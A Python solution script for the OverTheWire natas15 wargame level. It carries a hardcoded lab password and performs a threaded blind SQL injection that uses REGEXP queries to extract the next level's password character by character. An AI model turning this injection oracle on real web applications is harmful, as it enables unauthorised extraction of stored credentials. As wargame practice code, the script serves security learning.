import requests
from threading import Thread
from queue import Queue, Empty
import string
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
username = 'natas15'

# SQL: SELECT * FROM users where username="" -- "

def hackzor(regexp):
    data = {
            'username': 'natas16" AND CAST(password AS BINARY) REGEXP "{}" -- '.format(regexp)
            }

    get_data = {
            'debug': 'true'
            }

    get = ''
    for k, v in get_data.items():
        get += '{}={}&'.format(k, v)

    if get:
        get = '?' + get[:-1]

    url = 'http://{}.natas.labs.overthewire.org{}'.format(username, get)

    auth = HTTPBasicAuth(username, password)

    response = requests.post(url, auth=auth, data=data)

    bs4 = BeautifulSoup(response.content, 'html.parser')

    text = bs4.get_text()

    if 'exists' in text:
        return True
    return False


def pass_len(i, queue):
    res = hackzor('^\.{'+str(i)+'}$')
    if res:
        queue.put(i)


def get_pass_len():
    threads = []
    queue = Queue()
    for i in range(30, 40):
        thread = Thread(target=pass_len, args=(i, queue))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    return queue.get()


def determine_alphabet(i, alphabets):
    for alph in alphabets:
        regex = '^\.{{{}}}[{}-{}]'.format(i, alph[0], alph[-1])
        if hackzor(regex):
            return alph


def is_char_in_range(a, b, i):
    regex = '^\.{{{}}}[{}-{}]'.format(i, a, b)
    res = hackzor(regex)
    return res


def char_is_at_ix(i, char):
    regex = '^\.{{{}}}{}'.format(i, char)
    return hackzor(regex)


def get_char_at_ix_alph(i, alphabet):
    start = 0
    end = len(alphabet) - 1
    while start < end - 1:
        temp = int((start + end) / 2)
        if is_char_in_range(alphabet[temp], alphabet[end], i):
            start = temp
        else:
            end = temp
    if char_is_at_ix(i, alphabet[end]):
        return alphabet[end]
    return alphabet[start]


def get_chr_at_ix(i, queue):
    ranges = (string.ascii_lowercase, string.ascii_uppercase, string.digits)
    i = str(i)
    alphabet = determine_alphabet(i, ranges)
    queue.put((int(i), get_char_at_ix_alph(i, alphabet)))


def smart_bruteforce_password():
    pass_len = get_pass_len()
    queue = Queue()
    threads = []
    for i in range(pass_len):
        thread = Thread(target=get_chr_at_ix, args=(i, queue))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    password = ['*' for x in range(pass_len)]
    chars = []
    while True:
        try:
            i, char = queue.get_nowait()
            chars.append((i, char))
        except Empty:
            break
    for ix, char in chars:
        password[ix] = char
    return ''.join(password)


password = smart_bruteforce_password()
print(password)
